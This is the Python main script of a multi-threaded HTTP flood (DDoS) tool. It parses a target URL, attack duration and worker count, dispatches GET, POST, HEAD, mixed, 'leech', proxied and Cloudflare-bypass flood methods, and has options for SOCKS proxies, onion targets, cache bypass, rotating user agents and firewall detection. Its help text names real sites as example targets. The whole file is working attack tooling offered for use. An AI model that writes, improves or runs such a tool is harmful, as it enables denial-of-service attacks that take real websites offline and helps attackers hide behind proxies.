import sys

try:
  import argparse
except Exception as e:
  print('[ERROR] Failed to import argparse, aborting.')
  print(f'\nStacktrace: \n{str(e).strip()}')
  debug = False

if len(sys.argv) <= 1:
  sys.exit('[ERROR] No/Invalid arguments supplied.')
else:
  parser = argparse.ArgumentParser(prog=sys.argv[0], usage='%(prog)s [options] -t http://targetdomain.com', allow_abbrev=False)
  parser.add_argument('-t',   '--target',         dest = 'target',          default = None,     help='Target URL (Example: https://google.com or http://fbi.gov)', type=str)
  parser.add_argument('-p',   '--port',           dest = 'port',            default = None,     help='Target port (Leave empty to let the tool decide)', type=str)
  parser.add_argument('-d',   '--duration',       dest = 'duration',        default = 10,       help='Attack duration', type=int)
  parser.add_argument(        '--proxy-file',     dest = 'proxy_file_path', default = None,     help='File with proxies', type=str)
  parser.add_argument(        '--proxy',          dest = 'proxy',           default = None,     help='Use a proxy when attacking (Example: 127.0.0.1:1337)', type=str)
  parser.add_argument(        '--proxy-type',     dest = 'proxy_type',      default = 'SOCKS5', help='Set the proxy type (HTTP, SOCKS4 or SOCKS5)', type=str)
  parser.add_argument(        '--proxy-user',     dest = 'proxy_user',      default = None,     help='Proxy username', type=str)
  parser.add_argument(        '--proxy-pass',     dest = 'proxy_pass',      default = None,     help='Proxy password', type=str)
  parser.add_argument(        '--proxy-resolve',  dest = 'proxy_resolve',   default = True,     help='Resolve host using proxy (needed for hidden service targets)', action='store_true')
  parser.add_argument('-ua',  '--user-agent',     dest = 'useragent',       default = None,     help='User agent to use when attacking, else its dynamic', type=str)
  parser.add_argument('-ref', '--referer',        dest = 'referer',         default = None,     help='Referer to use when attacking, else its dynamic', type=str)
  parser.add_argument('-w',   '--workers',        dest = 'workers',         default = 100,      help='Amount of workers/threads to use when attacking', type=int)
  parser.add_argument('-dbg', '--debug',          dest = 'debug',           default = False,    help='Print info for devs', action='store_true')
  parser.add_argument('-bc',  '--bypass-cache',   dest = 'bypass_cache',    default = False,    help='Bypass the cache of the site', action='store_true')
  parser.add_argument('-m',   '--method',         dest = 'method',          default = 'GET',    help='Method to use when attacking (default: GET)', type=str)
  parser.add_argument('-dfw', '--detect-firewall',dest = 'detect_firewall', default = False,    help='Detect if the target site is protected by a firewall', action='store_true')
  args = vars(parser.parse_args())

  debug = args['debug']

try:
  from timeit import default_timer as timer
except:
  print('[WARN] Failed to import timeit, debug mode disabled.')
  debug = False

# Import modules
# This is just to test if we have them all
print('[INFO] Importing modules, hold on.')
try:
  if debug: s_start = timer()
  import os, threading, json, time, requests, cloudscraper, random, netaddr, selenium, undetected_chromedriver
  from colorama import Fore, init
  from urllib.parse import urlparse
  from requests.cookies import RequestsCookieJar
  if debug: 
    s_took = "%.2f" % (1000 * (timer() - s_start))
    print(f'[DEBUG] Importing modules took {str(s_took)} ms.')
  else:
    print(f'[INFO] Modules imported.')
except Exception as e:
  print('[ERROR] Failed to import modules, aborting. Please consider "pip install -r requirements.txt"')
  if debug: print(f'\n[DEBUG] Stacktrace: \n{str(e).strip()}')
  exit()

# Import depencies
print(f'[INFO] Importing depencies, hold on.')
try:
  if debug: s_start = timer()
  from src.utils import *
  from src.attacks import *
  from src.core import *
  if debug: 
    s_took = "%.2f" % (1000 * (timer() - s_start))
    print(f'[INFO] Importing depencies took {str(s_took)} ms.')
  else:
    print(f'[INFO] Depencies imported.')
except Exception as e:
  print(f'[DEBUG] Failed to import depencies, aborting.')
  if debug: print(f'\n[DEBUG] Stacktrace: \n{str(e).strip()}')
  exit()

method_dict = {
  'GET': http_get, # GET flood
  'POST': http_post, # POST flood
  'HEAD': http_head, # HEAD flood
  'FAST': http_fast, # GET / flood
  'GETHEADPOST': http_ghp, 'GHP': http_ghp, # GET/HEAD/POST flood
  'LEECH': http_leech, # leech attack
  'MIX': http_mix, # mixed http attack
  'BYPASS': http_cfbp, # cloudflare bypass
  'PROXY': http_proxy, # proxied http flood
}

if args['target'] is None:
  print(f'[ERROR] No target specified.')
  exit()

if not args['method'].upper() in method_dict.keys():
  print(f'[ERROR] Invalid method.')
  exit()

Core.bypass_cache = args['bypass_cache']
Core.proxy_file = args['proxy_file_path']
Core.proxy = args['proxy']
Core.proxy_type = args['proxy_type'].upper() # this here fixed the issue for IP leaks when using lowercase proxy types, eg; http instead of HTTP
Core.proxy_user = args['proxy_user']
Core.proxy_passw = args['proxy_pass']
Core.proxy_resolve = args['proxy_resolve']

if args['proxy'] != None and args['detect_firewall']:
  try: yorn = input('Detecting firewalls will leak the host lookup, are you sure you want to continue?').upper()
  except: exit()

  if yorn.startswith('N'): args['detect_firewall'] = False
  else: print('Alright, i warned ya!')
  time.sleep(2) # a small timeout if the user reconsiders his choice

init(autoreset=True) # initialize console

def main():
  print('')
  with open('src/banner.txt', 'r') as fd:
    [print(line.strip('\n')) for line in fd.readlines()]
  
  if isCF(socket.gethostbyname(urlparse(args['target']).netloc)):
    print('\n Target is protected by Cloudflare, attack might not work!\n')
  
  if args['detect_firewall']:
    print(f' Firewall: {fwDetect(args["target"])}')
  
  print(f'\n Target: [{args["target"]}]')
  print(f' Method: [{args["method"]}]')
  print(f' Duration: [{str(args["duration"])}]')
  print(f' Bypass cache: {str(args["bypass_cache"])}')
  print(f' Workers: [{str(args["workers"])}]\n')

  if args['proxy'] != None:
    print(f' Proxy: [{str(args["proxy"])}]')
    print(f' Proxy type: [{str(args["proxy_type"])}]')
    if args['proxy_username'] != None: print(f' Proxy username: [{str(args["proxy_username"])}]')
    if args['proxy_username'] != None: print(f' Proxy username: [{str(args["proxy_username"])}]')

  elif args['proxy_file_path'] != None:

    if os.path.isfile(args['proxy_file_path']):
      with open(args['proxy_file_path'], buffering=(2048*2048)) as fd:
        [Core.proxy_pool.append(x.rstrip()) for x in fd.readlines()]
    else:
      sys.exit(f' Could not find file: [{args["proxy_file_path"]}]')

    print(f' Proxy file path: [{args["proxy_file_path"]}]')
    print(f' Proxies loaded: [{str(len(Core.proxy_pool))}]')
    print(f' Proxy type: [{str(args["proxy_type"])}]')
  
  if args['useragent'] is None:
    print(f'\n User Agents: [{str(len(ualist))}]')
    
  if args['referer'] is None:
    print(f' Referers: [{str(len(reflist)+len(orlist))}]')
  
  print(f' Open Redirect bots: [{str(len(orlist))}]')
  print(f' Keywords: [{str(len(keywords))}]')

def attack():
  parsed = urlparse(str(args['target']))
  if args['proxy'] is None: # prevents leaks
    resolved_host = socket.gethostbyname(str(parsed.netloc)) if (not isIPv4(parsed.netloc) and not isIPv6(parsed.netloc) and not parsed.netloc.endswith('.onion')) else parsed.netloc
    if isIPv6(resolved_host): # small IPv6 check
      resolved_host = f'[{resolved_host}]' # adding this allows requests to send data to IPv6 addresses too 
  else: resolved_host = parsed.netloc

  sessobj = createsession()
  if args['method'] == 'BYPASS':

    if get_cookie(args['target']):
      scraper = cloudscraper.create_scraper(sess=requests.session())
      jar = RequestsCookieJar()
      jar.set(Core.bypass_cookieJAR['name'], Core.bypass_cookieJAR['value'])
      scraper.cookies = jar

      sessobj = scraper
    else: 
      print('Failed to get cookies'); os.kill(os.getpid(), 9)
      
  elif args['method'] == 'PROXY': # define the proxy type as session object (saves me some lines to code)
    sessobj = socks.SOCKS4 if 'SOCKS4' in Core.proxy_type else socks.HTTP if 'HTTP' in Core.proxy_type else socks.SOCKS5
  else:
    pass
  
  Core.attack_clear_to_go = True

  s_start = timer() # timer used for counting avg rps
  for i in range(int(args['workers'])):
    Core.infodict.update({str(i): {'req_sent': 0, 'req_fail': 0, 'req_total':0}})
    kaboom = threading.Thread(target=method_dict[args['method']], args=(str(i), sessobj, f'{parsed.scheme}://{resolved_host}', args['duration'], args['useragent'], args['referer'], ), daemon=True)
    kaboom.start()

    Core.threadbox.append(kaboom)
    Core.threadcount += 1
  
  for kaboom in Core.threadbox:
    kaboom.join()
  
  Core.attackrunning = False
  s_took = "%.2f" % (timer() - s_start) # how long it took for the attack to finish
  total_rqs = 0

  for _, workervalue in Core.infodict.items():
    total_rqs += workervalue['req_sent']

  Core.attack_length = s_took
  Core.avg_rps = float(total_rqs)/float(s_took)

if __name__ == '__main__':
  if not debug: clear()
  main()

  try: input('\nReady? (press enter) ')
  except: exit()

  threading.Thread(target=attack, daemon=True).start()
  Core.attackrunning = True

  while not Core.attack_clear_to_go: # while attack is not launching yet
    time.sleep(1)

  clear()

  worker_amount = 20 if args['workers'] > 20 else args['workers']
  while Core.attackrunning:
    try:

      info_dict = calcbestworkers(); i = 0
      for workerkey, workervalue in info_dict.items():
        if i >= 20: continue
        i += 1
      
        req_sent = str(workervalue['req_sent'])
        req_fail = str(workervalue['req_fail'])
        req_total = str(workervalue['req_total'])

        print(f'[INFO] {fy}[{fw}worker{frr}-{fw}{workerkey}{fy}]{frr} {fg}req_sent{frr}={req_sent} {fr}req_fail{frr}={req_fail} {fy}req_total{frr}={req_total} {fy}thread_count{frr}={str(Core.threadcount)}')
    
      # calculate results
      total_req_sent, total_req_fail, total_req = 0,0,0 # set it to 0
      for workerkey, workervalue in Core.infodict.items():
        total_req_sent += workervalue['req_sent']
        total_req_fail += workervalue['req_fail']
        total_req += workervalue['req_total']

      print(f'\n[INFO] Results: ')
      print(f'   - Requests sent: {str(total_req_sent)}')
      print(f'   - Requests failed: {str(total_req_fail)}')
      print(f'   - Requests total: {str(total_req)}')
    except Exception:
     Core.attackrunning = False
    
    try:
      time.sleep(2 if args['method'].upper() != 'LEECH' else 10)
      if Core.attackrunning: 
        clear()
    except:
      exit()
  
  print(f'   - Average requests per second: {str(Core.avg_rps)}')